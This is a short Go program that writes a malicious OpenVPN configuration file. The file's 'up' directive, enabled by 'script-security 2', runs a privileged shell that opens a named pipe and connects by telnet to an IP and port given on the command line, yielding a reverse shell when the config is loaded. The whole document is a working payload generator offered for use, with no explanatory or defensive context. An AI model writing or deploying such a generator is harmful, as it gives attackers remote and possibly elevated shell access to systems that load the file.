package main

import (
	"fmt"
	"os"
)

func create(ip, port, filename string) {
	payload := fmt.Sprintf(`up '/bin/sh -p -c "TF=$(mktemp -u);mkfifo $TF && telnet %s %s 0<$TF | sh 1>$TF"'
    dev null
    script-security 2`, ip, port)

	file, err := os.Create(filename + ".ovpn")
	if err != nil {
		fmt.Println("Error creating file:", err)
		return
	}
	defer file.Close()

	_, err = file.WriteString(payload)
	if err != nil {
		fmt.Println("Error writing payload:", err)
	}

	fmt.Printf("[+] %s.ovpn payload created\n", filename)
}

func main() {
	if len(os.Args) != 4 {
		fmt.Println("Usage: go run main.go <ip> <port> <filename>")
		return
	}

	ip := os.Args[1]
	port := os.Args[2]
	filename := os.Args[3]

	create(ip, port, filename)
}
